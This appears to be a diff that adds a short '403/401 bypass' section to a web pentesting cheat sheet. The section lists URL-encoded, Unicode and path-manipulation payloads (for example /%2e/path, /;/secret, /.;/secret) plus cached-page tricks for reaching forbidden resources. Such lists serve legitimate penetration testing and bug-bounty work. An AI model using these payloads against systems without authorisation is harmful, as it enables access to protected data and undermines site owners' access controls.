@@ -130,6 +130,26 @@ sqldump.sql
 
 ```
 
+## 403 401 bypass
+```
+- use wayback machine
+- use google dorks and see the cached version of the app
+- try /%2e/path or /%252e/path (this could bypass the protection by proxy)
+- Try Unicode bypass:/%ef%bc%8fpath
+
+site.com/secret –> HTTP 403 Forbidden
+site.com/SECRET –> HTTP 200 OK
+site.com/secret/ –> HTTP 200 OK
+site.com/secret/. –> HTTP 200 OK
+site.com//secret// –> HTTP 200 OK
+site.com/./secret/.. –> HTTP 200 OK
+site.com/;/secret –> HTTP 200 OK
+site.com/.;/secret –> HTTP 200 OK
+site.com//;//secret –> HTTP 200 OK
+site.com/secret.json –> HTTP 200 OK (ruby)
+  
+
+```
 
 ## fingerprinting
 
